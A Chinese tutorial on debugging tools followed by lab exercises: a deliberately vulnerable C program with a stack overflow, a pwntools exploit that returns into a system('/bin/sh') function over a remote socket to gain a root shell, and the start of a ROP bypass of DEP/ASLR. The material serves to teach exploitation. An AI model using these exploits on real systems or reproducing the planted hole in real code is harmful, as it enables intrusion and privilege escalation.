### PEDA 增强版介绍

PEDA 的增强版支持更多架构（如 ARM、MIPS、POWERPC 等），并提供了更强大的模块。此外，它还能够与 IDA Pro 联动，提供更全面的调试体验。

### 工具和插件

1. **libheap**：用于查看堆信息。
   - 安装命令：`pip3 install libheap --verbose`

2. **EDB**：一个跨平台的可视化调试器，类似于 Windows 上的 OllyDbg。

3. **lldb 插件**：
   - 参考链接：[https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw](https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw)

4. **voltron & lisa**：两个功能强大且用户界面友好的 lldb 插件。
   - voltron 与 tmux 结合使用时效果更佳。参考链接：[https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw](https://mp.weixin.qq.com/s/XGcEHpRuKEL2Dxn1kE7wpw)

### 实践案例

#### 实践平台
- 操作系统：Ubuntu 14.04_x64

#### 实践 1：栈溢出攻击

##### 编译测试用例
```c
#include <stdio.h>
#include <unistd.h>
#include <string.h>

void callsystem() {
    system("/bin/sh");
}

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
    write(STDOUT_FILENO, "Hello, World\n", 13);
    vulnerable_function();
}
```
- 编译方法：`gcc -fno-stack-protector linux_x64_test1.c -o linux_x64_test1 -ldl`

##### 安全检查
```bash
gdb-peda$ checksec linux_x64_test1
CANARY : disabled
FORTIFY : disabled
NX : ENABLED
PIE : disabled
RELRO : Partial
```
- 发现没有栈保护和 CANARY 保护。

##### 获取溢出偏移
- 使用 `pattern.py` 生成随机数据。
  ```bash
  python2 pattern.py create 150
  ```

- 使用 lldb 进行调试以找到溢出点。
  ```bash
  panda@ubuntu:~/Desktop/test$ lldb linux_x64_test1
  (lldb) target create "linux_x64_test1"
  (lldb) run
  ...
  (lldb) x/xg $rsp
  0x7fffffffdd58: 0x3765413665413565
  ```

- 计算偏移。
  ```bash
  python2 pattern.py offset 0x3765413665413565
  hex pattern decoded as: e5Ae6Ae7
  136
  ```

##### 构造 payload 并测试
- 获取 `callsystem` 函数地址。
  ```bash
  nm linux_x64_test1 | grep call
  00000000004005b6 T callsystem
  ```

- 使用 pwntools 编写利用脚本。
  ```python
  import pwn

  # p = pwn.process("./linux_x64_test1")
  p = pwn.remote('172.16.36.174', 10002)
  callsystem_address = 0x00000000004005b6
  payload = "A" * 136 + pwn.p64(callsystem_address)

  p.send(payload)
  p.interactive()
  ```

- 测试利用脚本。
  ```bash
  panda@ubuntu:~/Desktop/test$ python test.py
  [+] Starting local process './linux_x64_test1': pid 117455
  [*] Switching to interactive mode
  Hello, World
  $ whoami
  panda
  ```

- 将二进制程序设置为服务端程序。
  ```bash
  socat TCP4-LISTEN:10001,fork EXEC:./linux_x64_test1
  ```

- 测试远程程序。
  ```bash
  panda@ubuntu:~/Desktop/test$ python test2.py
  [+] Opening connection to 127.0.0.1 on port 10001: Done
  [*] Switching to interactive mode
  Hello, World
  $ whoami
  panda
  ```

- 如果进程以 root 权限运行。
  ```bash
  sudo socat TCP4-LISTEN:10001,fork EXEC:./linux_x64_test1
  ```

- 测试提权成功。
  ```bash
  panda@ubuntu:~/Desktop/test$ python test.py
  [+] Opening connection to 127.0.0.1 on port 10001: Done
  [*] Switching to interactive mode
  Hello, World
  $ whoami
  root
  ```

#### 实践 2：通过 ROP 绕过 DEP 和 ASLR 防护

##### 编译测试用例
- 添加辅助函数打印 `system` 地址。
  ```c
  #include <stdio.h>
  #include <unistd.h>
  #include <string.h>
  #include <dlfcn.h>

  void systemaddr() {
      void* handle = dlopen("libc.so.6", RTLD_LAZY);
      printf("%p\n", dlsym(handle, "system"));
      fflush(stdout);
  }

  void vulnerable_function() {
      char buf[128];
      read(STDIN_FILENO, buf, 512);
  }

  int main(int argc, char** argv) {
      systemaddr();
      write(1, "Hello, World\n", 13);
      vulnerable_function();
  }
  ```
- 编译方法：`gcc -fno-stack-protector linux_x64_test2.c -o linux_x64_test2 -ldl`

##### 安全检查
```bash
gdb-peda$ checksec linux_x64_test2
CANARY : disabled
FORTIFY : disabled
NX : ENABLED
PIE : disabled
RELRO : Partial
```

##### 观察 ASLR
- 运行两次，观察 `system` 函数地址的变化。
  ```bash
  panda@ubuntu:~/Desktop/test$ ./linux_x64_test2
  0x7f9d7d71a390
  Hello, World

  panda@ubuntu:~/Desktop/test$ ./linux_x64_test2
  0x7fa84dc3d390
  Hello, World
  ```

##### ROP 简介
- ROP（Return-oriented programming）是一种高级内存攻击技术，可以绕过现代操作系统的各种通用防御机制，如内存不可执行（DEP）和代码签名等。

##### 寻找 ROP gadget
- 使用 ROPgadget 工具在二进制文件及其库中搜索合适的 gadget。
  ```bash
  panda@ubuntu:~/Desktop/test$ ROPgadget --binary linux_x64_test2 --only "pop ret"
  Gadgets information
  ============================================================
  Unique gadgets found: 0
  ```

- 查看二进制文件的依赖库。
  ```bash
  panda@ubuntu:~/Desktop/test$ ldd linux_x64_test2
  ...
  libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fdc04f55000)
  ```

- 在库中搜索 `pop ret` gadget。
  ```bash
  panda@ubuntu:~/Desktop/test$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6
  0x0000000000020256 : pop rdi ; pop rbp ; ret
  0x0000000000021102 : pop rdi ; ret
  ```

- 决定使用 `0x0000000000021102`，并在库中搜索 `/bin/sh` 字符串。
  ```bash
  panda@ubuntu:~/Desktop/test$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6
  ```

通过以上步骤，你可以更好地理解和实践常见的保护手段和攻击手法。